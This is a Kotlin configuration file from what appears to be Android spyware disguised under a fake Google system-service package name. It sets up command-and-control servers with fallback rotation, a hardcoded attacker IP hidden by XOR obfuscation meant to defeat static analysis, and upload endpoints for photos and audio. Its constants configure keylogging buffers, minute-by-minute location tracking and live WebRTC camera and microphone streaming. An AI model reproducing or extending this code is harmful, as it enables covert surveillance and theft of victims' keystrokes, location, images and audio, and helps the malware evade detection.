package com.google.android.systemservice.config

import android.content.Context
import com.google.android.systemservice.BuildConfig

object AndroidConfig {
    // Server Configuration
    // Configured via Gradle property: -PserverBaseUrl="IP:PORT"
    @Volatile private var serverBaseUrl = BuildConfig.SERVER_BASE_URL
    @Volatile private var useHttps = false
    
    // Fallback C2 servers (tried in order if primary fails)
    private val fallbackServers = mutableListOf<String>()
    @Volatile private var currentServerIndex = 0
    
    // API Authentication Token - loaded from BuildConfig (set via Gradle property -PdeviceToken="...")
    val DEVICE_TOKEN: String = BuildConfig.DEVICE_AUTH_TOKEN
    val deviceToken: String get() = DEVICE_TOKEN
    
    // Device Identifier (cached from Settings.Secure.ANDROID_ID)
    @Volatile var deviceId: String = ""
        private set
    
    // Dynamic String Obfuscation
    // Decodes XORed strings to prevent static analysis 'strings' command discovery
    private fun mask(input: String, key: Int = 42): String {
        val result = StringBuilder()
        for (i in input.indices) {
            result.append((input[i].toInt() xor key).toChar())
        }
        return result.toString()
    }

    // "http://213.91.211.150:8080/" XORed with 42
    private val MASKED_BASE_URL = "rzzj@%%\"#/%#%\"\"#&%.\".\"%%\"&'\"%" 

    /**
     * Initialize device ID from Android system (call once on app start)
     */
    fun initDeviceId(context: Context) {
        if (deviceId.isEmpty()) {
            deviceId = try {
                android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                ) ?: java.util.UUID.randomUUID().toString()
            } catch (e: Exception) {
                // Ssaid not accessible on some devices/emulators/secondary profiles
                android.util.Log.w("AndroidConfig", "ANDROID_ID not accessible: ${e.message}")
                java.util.UUID.randomUUID().toString()
            }
        }
    }
    
    // Computed URLs
    val httpProtocol: String
        get() = if (useHttps) "https" else "http"
    
    val wsProtocol: String
        get() = if (useHttps) "wss" else "ws"
    
    val serverUrl: String
        get() = if (serverBaseUrl.startsWith("http://") || serverBaseUrl.startsWith("https://")) serverBaseUrl else "$httpProtocol://$serverBaseUrl"
    
    val websocketUrl: String
        get() {
            val base = when {
                serverBaseUrl.startsWith("https://") -> serverBaseUrl.replaceFirst("https://", "wss://")
                serverBaseUrl.startsWith("http://") -> serverBaseUrl.replaceFirst("http://", "ws://")
                else -> "ws://$serverBaseUrl"
            }.trimEnd('/')
            return "$base/cable?token=$DEVICE_TOKEN"
        }
    
    val apiBaseUrl: String
        get() = "${serverUrl.trimEnd('/')}/api"
    
    // Specific endpoints
    val photosEndpoint: String
        get() = "$apiBaseUrl/photos"
    
    val audioEndpoint: String
        get() = "$apiBaseUrl/audio"
    
    val configEndpoint: String
        get() = "$apiBaseUrl/config"
    
    // Polling intervals (milliseconds)
    const val LOCATION_UPDATE_INTERVAL = 60000L // 1 minute
    const val COMMAND_RECONNECT_DELAY = 5000L // 5 seconds
    const val KEYLOG_BUFFER_FLUSH_INTERVAL = 300000L // 5 minutes
    
    // Buffer sizes
    const val MAX_KEYLOG_BUFFER_SIZE = 500000 // 500KB
    const val MAX_PHOTO_BATCH_SIZE = 5
    const val MAX_AUDIO_BATCH_SIZE = 10
    
    // WebRTC Configuration
    const val WEBRTC_VIDEO_WIDTH = 1280
    const val WEBRTC_VIDEO_HEIGHT = 720
    const val WEBRTC_VIDEO_FPS = 30
    const val WEBRTC_AUDIO_ECHO_CANCELLATION = true
    const val WEBRTC_AUDIO_NOISE_SUPPRESSION = true
    
    /**
     * Update server configuration dynamically
     */
    fun updateServerConfig(host: String, port: Int, https: Boolean = false) {
        serverBaseUrl = "$host:$port"
        useHttps = https
    }

    /**
     * Get just the server hostname (for SSL pinning)
     */
    fun getServerHost(): String {
        return try {
            java.net.URI(serverUrl).host ?: serverBaseUrl.removePrefix("https://").removePrefix("http://").split(":").first().split("/").first()
        } catch (e: Exception) {
            serverBaseUrl.removePrefix("https://").removePrefix("http://").split(":").first().split("/").first()
        }
    }

    /**
     * Add fallback C2 server URLs (tried in order if primary fails)
     */
    fun addFallbackServer(url: String) {
        if (url !in fallbackServers) fallbackServers.add(url)
    }

    /**
     * Switch to next available C2 server. Returns true if switched, false if no more servers.
     */
    fun switchToNextServer(): Boolean {
        val allServers = mutableListOf(BuildConfig.SERVER_BASE_URL)
        allServers.addAll(fallbackServers)
        currentServerIndex++
        if (currentServerIndex >= allServers.size) {
            currentServerIndex = 0 // wrap around
            return false
        }
        serverBaseUrl = allServers[currentServerIndex]
        android.util.Log.d("AndroidConfig", "Switched to C2 server #$currentServerIndex: $serverBaseUrl")
        return true
    }

    /**
     * Reset to primary server
     */
    fun resetToPrimaryServer() {
        currentServerIndex = 0
        serverBaseUrl = BuildConfig.SERVER_BASE_URL
    }
    
    /**
     * Load configuration from SharedPreferences
     */
    fun loadFromPreferences(context: Context) {
        val prefs = context.getSharedPreferences("android_config", Context.MODE_PRIVATE)
        serverBaseUrl = prefs.getString("server_base_url", serverBaseUrl) ?: serverBaseUrl
        currentServerIndex = 0
        useHttps = prefs.getBoolean("use_https", useHttps)
    }
    
    /**
     * Save configuration to SharedPreferences
     */
    fun saveToPreferences(context: Context) {
        context.getSharedPreferences("android_config", Context.MODE_PRIVATE).edit().apply {
            putString("server_base_url", serverBaseUrl)
            putBoolean("use_https", useHttps)
            apply()
        }
    }
    
    /**
     * Fetch configuration from server (optional)
     */
    suspend fun syncFromServer(context: Context) {
        try {
            // TODO: Implement HTTP call to fetch config from server
            // This allows server-side configuration updates
            // Example: GET /api/config returns { "server": "...", "port": ..., "https": ... }
        } catch (e: Exception) {
            android.util.Log.e("AndroidConfig", "Failed to sync config from server: ${e.message}")
        }
    }
}
